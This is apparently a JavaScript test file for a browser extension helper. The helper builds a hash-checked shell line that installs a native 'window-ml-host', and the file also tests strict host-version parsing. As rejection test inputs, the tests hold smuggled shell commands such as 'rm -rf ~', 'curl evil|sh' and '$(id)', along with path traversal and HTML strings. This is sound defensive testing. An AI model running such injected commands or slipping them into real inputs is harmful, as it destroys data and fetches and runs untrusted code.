// host-install.test.mjs — the line Settings shows to install the process host (src/shell/host-install.ts): built only from
// this install's id and the committed pin, for the platforms the release has a build for, never from anything else.

import { test } from "node:test";
import assert from "node:assert/strict";

const { hostInstall, EXTENSION_ID_RE, parseHostVersion, hostOutdated, pinnedHostVersion, formatHostVersion } = await import("../src/shell/host-install.ts");
const ID = "abcdefghijklmnopabcdefghijklmnop";
const PIN = { tag: "v0.10.0", installer: { file: "install.sh", sha256: "ab".repeat(32) } };

// --- the line ---

test("macOS and Linux get the pinned installer, its hash checked before it runs, and the id", () => {
    const mac = hostInstall({ os: "mac", arch: "arm64" }, ID, PIN);
    assert.ok(mac.ok);
    assert.equal(mac.line, `f=$(mktemp) && curl -fsSL https://github.com/parawanderer/window-ml-host/releases/download/v0.10.0/install.sh -o "$f" && echo "${"ab".repeat(32)}  $f" | shasum -a 256 -c - && sh "$f" --extension-id ${ID}`);
    assert.equal(hostInstall({ os: "mac", arch: "x86-64" }, ID, PIN).line, mac.line, "Intel Macs: the same line");
    const linux = hostInstall({ os: "linux", arch: "x86-64" }, ID, PIN);
    assert.match(linux.line, /\| sha256sum -c - && sh/);
    assert.ok(hostInstall({ os: "linux", arch: "arm" }, ID, PIN).ok, "Chrome reports arm64 Linux as arm on some builds");
});

test("in Brave the line registers Brave's own folder, and only then", () => {
    const brave = hostInstall({ os: "mac", arch: "arm64", browser: "brave" }, ID, PIN);
    assert.ok(brave.ok && brave.line.endsWith(`--extension-id ${ID} --browser brave`));
    assert.ok(!hostInstall({ os: "mac", arch: "arm64" }, ID, PIN).line.includes("--browser"), "Chrome is the installer's default, so the line says nothing");
    assert.ok(!hostInstall({ os: "linux", arch: "x86-64", browser: "chrome" }, ID, PIN).line.includes("--browser"), "no other value reaches the line");
});

test("a platform with no build, a pin with no installer, and a malformed pin each show no line", () => {
    for (const p of [{ os: "win", arch: "x86-64" }, { os: "cros", arch: "arm64" }, { os: "linux", arch: "x86-32" }, { os: "mac", arch: "mips" }]) {
        const r = hostInstall(p, ID, PIN);
        assert.ok(!r.ok && /no window-ml-host build/.test(r.why), `${p.os} ${p.arch}`);
    }
    assert.match(hostInstall({ os: "mac", arch: "arm64" }, ID, { tag: "v0.9.0" }).why, /no installer/, "v0.9.0 has none");
    for (const bad of [{ tag: "v0.10.0; rm -rf ~", installer: PIN.installer }, { tag: "v0.10.0", installer: { file: "install.sh; curl evil|sh", sha256: "ab".repeat(32) } }, { tag: "v0.10.0", installer: { file: "install.sh", sha256: "x".repeat(64) } }]) {
        assert.ok(!hostInstall({ os: "mac", arch: "arm64" }, ID, bad).ok, "a pin that is not a tag and a hash is refused before it reaches a shell");
    }
});

test("the committed pin yields a line or says why not, and never the id it was not given", () => {
    const r = hostInstall({ os: "mac", arch: "arm64" }, ID);
    if (r.ok) assert.ok(r.line.includes(ID) && !r.line.includes("undefined"));
    else assert.match(r.why, /installer/);
});

// --- the id is the extension's own, and only that ---

test("only a 32-letter a-p id reaches the line: anything else, a quote, a semicolon, a path, is refused", () => {
    for (const bad of ["", "abc", `${ID}; curl evil|sh`, `${ID}"`, "../".repeat(11), ID.toUpperCase(), `${ID}q`, ID.slice(1), "$(id)".padEnd(32, "a")]) {
        const r = hostInstall({ os: "mac", arch: "arm64" }, bad, PIN);
        assert.ok(!r.ok, `refused: ${JSON.stringify(bad)}`);
        assert.ok(!EXTENSION_ID_RE.test(bad));
    }
});

// --- the host-version hint: only a host KNOWN to be behind the pin is offered an update ---

test("a reported version is parsed strictly: three whole numbers, and anything else is unknown", () => {
    assert.deepEqual(parseHostVersion("0.10.0"), [0, 10, 0]);
    assert.equal(formatHostVersion(parseHostVersion("12.3.456")), "12.3.456");
    for (const bad of ["", "0.10", "0.10.0.1", "v0.10.0", "0.10.0-dev", "0.10.0 ", " 0.10.0", "1.2.x", "01.2.3x", "-1.0.0", "1e3.0.0", "99999.0.0", "0.10.0\n", "0.10.0; curl evil|sh", "<b>1.0.0</b>", null, undefined, 10, ["0.10.0"], { toString: () => "0.10.0" }]) {
        assert.equal(parseHostVersion(bad), null, `unknown: ${JSON.stringify(bad)}`);
    }
});

test("only a host older than the pin is outdated: equal, newer and unknown say no, and a malformed pin says no", () => {
    const pin = { tag: "v0.10.0" };
    const v = (s) => parseHostVersion(s);
    assert.equal(hostOutdated(v("0.9.0"), pin), true);
    assert.equal(hostOutdated(v("0.9.99"), pin), true);
    assert.equal(hostOutdated(v("0.0.1"), pin), true);
    assert.equal(hostOutdated(v("0.10.0"), pin), false, "equal");
    assert.equal(hostOutdated(v("0.10.1"), pin), false, "newer in the patch");
    assert.equal(hostOutdated(v("0.11.0"), pin), false, "newer in the minor");
    assert.equal(hostOutdated(v("1.0.0"), pin), false, "newer in the major");
    assert.equal(hostOutdated(v("0.9.0-dev"), pin), false, "unknown is never outdated");
    assert.equal(hostOutdated(null, pin), false);
    for (const tag of ["0.10.0", "v0.10", "v0.10.0; rm", "latest", ""]) assert.equal(hostOutdated(v("0.0.1"), { tag }), false, `a pin that is not a tag: ${tag}`);
    assert.deepEqual(pinnedHostVersion(pin), [0, 10, 0]);
    // Order is by number, not by text: 0.9.0 < 0.10.0 although "0.9.0" > "0.10.0" as strings.
    assert.equal(hostOutdated(v("0.9.0"), { tag: "v0.10.0" }), true);
    assert.equal(hostOutdated(v("0.10.0"), { tag: "v0.9.0" }), false);
});

test("Settings' status line draws the host's version only in its parsed form", async () => {
    const { shellStatusText } = await import("../src/sidebar/settings/shell-section.tsx");
    const ready = (version) => shellStatusText({ enabled: true, ready: true, sandboxed: true, host: { version, platform: "macos" } });
    assert.match(ready("0.10.0"), /^Ready: window-ml-host 0\.10\.0 on macos/);
    for (const bad of ["0.10.0-dev", "<b>x</b>", "banana"]) {
        const text = ready(bad);
        assert.match(text, /^Ready: window-ml-host \? on macos/, bad);
        assert.ok(!text.includes(bad), `the raw ${bad} is not drawn`);
    }
});
